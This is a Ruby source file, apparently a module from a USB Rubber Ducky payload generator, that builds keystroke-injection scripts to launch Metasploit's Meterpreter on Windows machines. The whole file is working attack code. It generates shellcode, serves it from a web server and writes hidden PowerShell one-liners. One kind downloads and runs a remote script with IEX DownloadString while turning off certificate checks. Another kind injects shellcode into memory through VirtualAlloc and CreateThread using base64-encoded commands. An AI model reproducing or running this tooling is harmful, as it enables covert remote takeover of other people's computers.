#!/usr/bin/env ruby
# Thanks to:
# @mattifestation, @obscuresec, and @HackingDave
require 'skeleton'
require 'metasploit'
class Meterpreter < Skeleton
  include Msf::Options
  attr_reader :ducky
  self.title = 'Launch Meterpreter'
  self.description = 'Download and Execute meterpreter shellcode '
  description << 'from a web server or Reflectivly load Meterpreter Localy'

  def meterp_delivery
    puts 'Meterpreter Delivery'
    _options.each do |key, ops|
      puts "#{key}) #{ops}"
    end
    @dev = rgets('Choice: ', '1')
  end

  def _options
    { :'1' => 'Web Delivery',
      :'2' => 'Reflectivly Load'
    }
  end

  def setup
    meterp_delivery until  @dev == '1' || @dev == '2'
    @msf = Msf::MsfCommands.new
    if @dev == '1'
      @host = @server_setup.host
      @port = @server_setup.port
      @ssl = @server_setup.use_ssl?
    end
    @payload = @msf.payload_select
    @msf_host = msf_host
    @msf_port = msf_port
  end

  def run
    @shellcode = @msf.generate_shellcode(@msf_host, @msf_port, @payload)
    return if @dev != '1'
    server = Server::Start.new(@ssl, @host, @port)
    if @server_setup.host_payload?
      Thread.new { server.host_raw(powershell_command2) }
    else
      @uri = @server_setup.uri
    end
  end

  def finish
    priv_choice = @ducky_writer.menu
    File.open("#{text_path}#{@file_name}.txt", 'w') do |f|
      f.write(@ducky_writer.write(priv_choice))
      if @dev == '1'
        if @ssl
          f.write(web_powershell_command("https://#{@host}:#{@port}/#{@uri}"))
        else
          f.write(web_powershell_command("http://#{@host}:#{@port}/#{@uri}"))
        end
      else
        f.write(reflective_powershell_command(
          encode_command(powershell_command2)))
      end
    end
    Ducky::Compile.new("#{@file_name}.txt")
    @msf.start(@msf_host, @msf_port) if @msf.start_metasploit?
  end

  def web_powershell_command(url)
    psh = 'powershell -windowstyle hidden '
    if @ssl
      psh << '[System.Net.ServicePointManager]::'
      psh << 'ServerCertificateValidationCallback = { $true };'
    end
    psh << 'IEX (New-Object '
    psh << "Net.WebClient).DownloadString('#{url}')"
  end

  def reflective_powershell_command(encoded_command)
    psh = 'powershell -nop -wind hidden -noni -enc '
    psh << "#{encoded_command}"
  end

  def powershell_command2
    s = %($1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr )
    s << 'VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, '
    s << "uint flProtect);[DllImport(\"kernel32.dll\")]public static extern "
    s << 'IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, '
    s << 'IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, '
    s << "IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern "
    s << "IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type "
    s << %(-memberDefinition $c -Name "Win32" -namespace Win32Functions )
    s << "-passthru;[Byte[]];[Byte[]]$sc = #{@shellcode};$size = 0x1000;if "
    s << '($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::'
    s << 'VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);'
    s << '$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::'
    s << "CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = "
    s << '[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.'
    s << 'GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + '
    s << %("\\syswow64\\WindowsPowerShell\\v1.0\\powershell";$cmd = "-nop )
    s << %(-noni -enc";iex "& $x86 $cmd $gq"}else{$cmd = "-nop -noni -enc";)
    s << %(iex "& powershell $cmd $gq";})
  end
end
